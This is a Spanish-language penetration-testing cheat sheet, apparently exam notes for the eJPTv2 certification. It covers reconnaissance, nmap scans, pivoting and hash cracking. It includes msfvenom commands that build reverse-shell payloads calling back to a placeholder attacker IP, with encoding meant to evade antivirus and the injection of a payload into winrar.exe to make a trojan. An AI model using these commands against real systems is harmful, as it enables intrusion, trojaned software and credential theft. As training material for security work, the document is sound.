FASE 1 — RECONNAISSANCE
¿Estás en red interna? ¿Qué hosts hay vivos?
📡 Orientación en la red (primer paso SIEMPRE)
# ¿Quién soy y en qué red estoy?
ip a                    # Mi IP y interfaces
ip -br -c a             # Versión compacta y coloreada
ip route                # Mis rutas y gateway
cat /etc/hosts          # Hosts conocidos (¡ojo aquí!)

# Windows equivalentes
ipconfig /all
route print
netstat -r
🔭 Descubrimiento de hosts vivos
# Método 1: nmap ping sweep (más común)
nmap -sn 10.10.10.0/24

# Método 2: fping (más rápido)
fping -a -g 10.10.10.0/24 2>/dev/null > targets.txt

# Método 3: Script bash manual
for host in {1..254}; do
  ping -c 1 10.10.10.$host | grep "64 bytes" | \
  cut -d ":" -f 1 | cut -d " " -f 4
done

# Método 4: netdiscover (ARP, muy silencioso)
netdiscover -r 10.10.10.0/24
💡 Tip crítico del examen: En el eJPTv2 siempre revisa /etc/hosts y las rutas. Muchas veces hay subredes ocultas que necesitas descubrir para llegar al target real.

FASE 2 — SCANNING
¿Qué puertos y servicios tiene? SIEMPRE escanea todos los puertos.
⚡ Flujo de Scanning recomendado
# PASO 1: Scan rápido de puertos comunes
nmap -sV -sC -T4 <TARGET_IP> -oN scan_inicial.txt

# PASO 2: Scan COMPLETO (no te lo saltes!)
nmap -p- -T4 <TARGET_IP> -oN all_ports.txt

# PASO 3: Scan detallado solo en puertos abiertos
nmap -sV -sC -p 22,80,443,8080 <TARGET_IP> -oN scan_detallado.txt

# PASO 4: Scan agresivo (más info, más ruido)
nmap -sS -A <TARGET_IP>

# PASO 5: UDP si sospechas servicios (lento!)
nmap -sU -sV <TARGET_IP> -oN udp_scan.txt
🎯 Scans especializados por objetivo
# Detección de OS
nmap -Pn -O <TARGET_IP>

# Scan de vulnerabilidades
nmap --script vuln -p <OPEN_PORTS> <TARGET_IP>

# Scan específico SMB vulnerabilidades
nmap -p445 --script=smb-vuln-* <TARGET_IP> -v

# EternalBlue check
nmap --script smb-vuln-ms17-010 -p 445 <TARGET_IP>

# HeartBleed SSL check
nmap -sV --script ssl-heartbleed -p 443 <TARGET_IP>

# Guardar en múltiples formatos
nmap -sV -sC <TARGET_IP> -oA nmap_full

msfvenom — Generación de Payloads
Staged (/) vs Non-Staged (_) — recuérdalo siempre
💡 Staged vs Non-Staged: windows/meterpreter/reverse_tcp = STAGED (/) — necesita multi/handler para enviar el stage. windows/meterpreter_reverse_tcp = NON-STAGED (_) — payload completo, se ejecuta solo. Para el eJPTv2 usa staged por defecto.
🪟 Windows Payloads
# Win 32bit .exe
msfvenom -a x86 -p windows/meterpreter/reverse_tcp \
  LHOST=<YOUR_IP> LPORT=4444 -f exe > payload_x86.exe

# Win 64bit .exe
msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp \
  LHOST=<YOUR_IP> LPORT=4444 -f exe > payload_x64.exe

# Win ASP (IIS/WebDAV)
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=<YOUR_IP> LPORT=4444 -f asp > shell.asp

# Win ASPX (.NET)
msfvenom -p windows/x64/meterpreter/reverse_https \
  LHOST=<YOUR_IP> LPORT=443 -f aspx > shell.aspx

# WAR (Tomcat)
msfvenom -p java/jsp_shell_reverse_tcp \
  LHOST=<YOUR_IP> LPORT=4444 -f war > shell.war

# Con encoding (evasion básica)
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=<YOUR_IP> LPORT=4444 \
  -e x86/shikata_ga_nai -i 10 -f exe > payload_encoded.exe

# Inyectar en ejecutable legítimo
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=<YOUR_IP> LPORT=4444 \
  -e x86/shikata_ga_nai -i 10 \
  -f exe -x winrar.exe > malicious_winrar.exe

Pivoting — Llegar a redes ocultas
Uno de los temas más importantes del eJPTv2
⚠️ Cuándo usarlo: Cuando estás dentro de una máquina y ves una segunda red en ifconfig/ip a (ej: el target tiene 10.10.10.5 y también 192.168.1.5 — la red 192.168.1.0/24 es tu nuevo objetivo).
🔀 Pivoting con Metasploit (Autoroute)
# Dentro de Meterpreter — ver interfaces de red
ifconfig
route

# Agregar ruta (autoroute)
run autoroute -s 192.168.1.0/24
run autoroute -p          # ver rutas activas

# Desde msfconsole
background
use post/multi/manage/autoroute
set SESSION 1
set SUBNET 192.168.1.0
run

# Port forwarding (acceder a puerto remoto)
portfwd add -l 3389 -p 3389 -r 192.168.1.5
# Ahora conectas a localhost:3389 → 192.168.1.5:3389
portfwd list

# Socks proxy (para herramientas externas)
use auxiliary/server/socks_proxy
set SRVPORT 9050
set VERSION 5
run -j

# Luego en proxychains.conf:
# socks5 127.0.0.1 9050
proxychains nmap -sT -Pn -p 22,80,445 192.168.1.5
🛣️ Rutas manuales (sin MSF)
# Linux — agregar ruta manualmente
# Sintaxis: ip route add <RED> via <GATEWAY> dev <INTERFACE>

# Ejemplo típico en eJPTv2:
ip route add 10.10.10.0/24 via 10.10.11.1 dev tap0

# Verificar ruta agregada
ip route
route

# Windows
route add 192.168.1.0 mask 255.255.255.0 10.10.10.1

🔓 John the Ripper & Hashcat
## John the Ripper
# Crackear /etc/shadow
unshadow /etc/passwd /etc/shadow > unshadowed.txt
john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt

# Con formato específico
john --wordlist=/usr/share/wordlists/rockyou.txt \
  --format=raw-md5 hash.txt

# Ver resultados
john --show hash.txt

# Listar formatos soportados
john --list=formats

# Con reglas (mangling)
john --wordlist=/usr/share/wordlists/rockyou.txt \
  --rules hash.txt

## Hashcat
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt  # MD5
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt # NTLM
hashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt # sha512crypt
